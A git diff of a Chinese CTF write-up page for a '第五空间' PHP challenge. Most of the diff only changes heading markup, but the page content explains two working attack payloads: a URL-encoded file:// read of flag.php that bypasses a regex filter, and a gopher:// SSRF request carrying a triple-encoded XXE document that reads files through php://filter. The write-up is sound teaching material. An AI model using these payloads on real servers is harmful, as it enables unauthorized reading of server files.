@@ -156,7 +156,7 @@
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h1 id="第五空间"><a href="#第五空间" class="headerlink" title="第五空间"></a>第五空间</h1><h2 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h2><p>源码</p>
+                <h1><span id="第五空间">第五空间</span></h1><h2><span id="do-you-know">do you know</span></h2><p>源码</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token shell-comment comment">#本题无法访问外网</span>
@@ -261,18 +261,18 @@
 <p>因为QUERY_STRING不会urldecode，所以只需进行url编码绕过就行了。</p>
 <p>本题只需把字母啥的都urlencode就直接bypass了正则，然后就随便打了，直接curl一下</p>
 <p>file:///var/www/html/flag.php即可，想读什么都行</p>
-<pre><code>?a=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</code></pre><h4 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h4><p>学习一下操作，用<code>gopher</code>进行<code>ssrf</code>发送<code>post</code>请求给<code>xxe.php</code></p>
+<pre><code>?a=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</code></pre><h4><span id="预期解">预期解：</span></h4><p>学习一下操作，用<code>gopher</code>进行<code>ssrf</code>发送<code>post</code>请求给<code>xxe.php</code></p>
 <p>大致就是用gopher协议访问内网。</p>
 <pre><code>?a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250d%250aHost%3a127.0.0.1%3a80%250d%250aAccept%3a*/*%250d%250aContent-Length%3a611%250d%250aContent-
 Type%3aapplication/x-www-form-urlencoded%250d%250a%250d%250adata=%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</code></pre><p>首先分析一下前一部分</p>
-<pre><code>gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250d%250aHost%3a127.0.0.1%3a80%250d%250aAccept%3a*/*%250d%250aContent-Length%3a611%250d%250aContent-Type%3aapplication/x-www-form-urlencoded</code></pre><h5 id="注意必须包括端口，否则gopher访问不到"><a href="#注意必须包括端口，否则gopher访问不到" class="headerlink" title="注意必须包括端口，否则gopher访问不到"></a>注意必须包括端口，否则<code>gopher</code>访问不到</h5><p>由于<code>gopher</code>协议传递数据包的时候会将第一个字符吞掉，所以我们在前面加一个<code>_</code>，然后后面接数据包</p>
+<pre><code>gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250d%250aHost%3a127.0.0.1%3a80%250d%250aAccept%3a*/*%250d%250aContent-Length%3a611%250d%250aContent-Type%3aapplication/x-www-form-urlencoded</code></pre><h5><span id="注意必须包括端口否则gopher访问不到">注意必须包括端口，否则<code>gopher</code>访问不到</span></h5><p>由于<code>gopher</code>协议传递数据包的时候会将第一个字符吞掉，所以我们在前面加一个<code>_</code>，然后后面接数据包</p>
 <p>数据包有很多请求头，但只有一部分是必须的</p>
 <p>上面的第一部分下列请求头的url编码（包括换行<code>%0d%0a</code>，而且这儿需要将<code>%</code>进行二次编码）</p>
 <pre><code>POST /xee.php HTTP/1.1
 HOST:127.0.0.1:80
 Accept:*/*
 Content-Length:611
-Content-Type:application/x-www-form-urlencoded</code></pre><h4 id="POST发送数据的时候，数据于请求头中间有两个-0d-0a"><a href="#POST发送数据的时候，数据于请求头中间有两个-0d-0a" class="headerlink" title="POST发送数据的时候，数据于请求头中间有两个%0d%0a"></a>POST发送数据的时候，数据于请求头中间有两个<code>%0d%0a</code></h4><p>这个Content-Length:611表示发送数据的大小<br>例如我们POST data=xxx，则Content-Length为8，无论你进行多少次url编码，都会将我们发送的数据解码成data=xxx，所以有时候我们进行多次url编码，但是服务器还是能识别，这就是Content-Length的作用</p>
+Content-Type:application/x-www-form-urlencoded</code></pre><h4><span id="post发送数据的时候数据于请求头中间有两个0d0a">POST发送数据的时候，数据于请求头中间有两个<code>%0d%0a</code></span></h4><p>这个Content-Length:611表示发送数据的大小<br>例如我们POST data=xxx，则Content-Length为8，无论你进行多少次url编码，都会将我们发送的数据解码成data=xxx，所以有时候我们进行多次url编码，但是服务器还是能识别，这就是Content-Length的作用</p>
 <p>我们知道这道题目实际就是gopher进行xxe攻击，我们只需要用gopher发送一个能读取文件的xml过去就可以了，而且实际题目有一些过滤，双写绕过就行了，所以随便找个能读文件的xml如下</p>
 <pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ureadtf-8&quot;?&gt;
 &lt;!DOCTYPE xe [
@@ -282,7 +282,7 @@ Content-Type:application/x-www-form-urlencoded</code></pre><h4 id="POST发送数
 &lt;name&gt;&amp;xe;&lt;/name&gt;
 &lt;/root&gt;</code></pre><p>这儿还有一个需要注意的点<br>我们在计算长度的时候不能直接计算明文的长度，这是因为上面的字符有一些特殊字符，而这些特殊字符又有实际的含义，例如&amp;<br>假设我们只计算明文的长度，则不管我们怎么url编码，服务器都会解析成明文的格式<br>即访问xxe.php是发送的数据为data=&lt;?xml version=”1.0” enco….这样就会包含特殊符号，就不能正确传输数据</p>
 <p>正确的做法是：<br>1、对payload（即xml）所以字符进行url编码，计算编码后的长度，例上面的xml编码后长度为606，加上data=，总长度为610<br>2、先把编码后的数据加在data=的后面<br>3、直接在burpsuite里面编码（只对特殊字符编码即可，即%，因为GET方法有长度限制，如果编码太长不能发送请求）（再编两次码，总共对xml三次编码，因为我们发送请求时浏览器本身会编一次码，然后gopher发送数据时也会编码一次，所以只有编码三次，到达xxe.php的数据才是xml第一次编码之后的数据，否则直接是明文数据，不能有效传递xml，如果编码四次也不行，只能三次，这只是针对特殊字符的）<br>4、burpsuite对特殊字符编码的地方</p>
-<img src="https://s1.ax1x.com/2020/07/25/Ux4MDS.png" style="zoom:80%;" />
+<img src="https://s1.ax1x.com/2020/07/25/Ux4MDS.png" style="zoom:80%;">
 
 <p>最后base64解码得到flag。真的学到了很多操作。加油！！！</p>
 
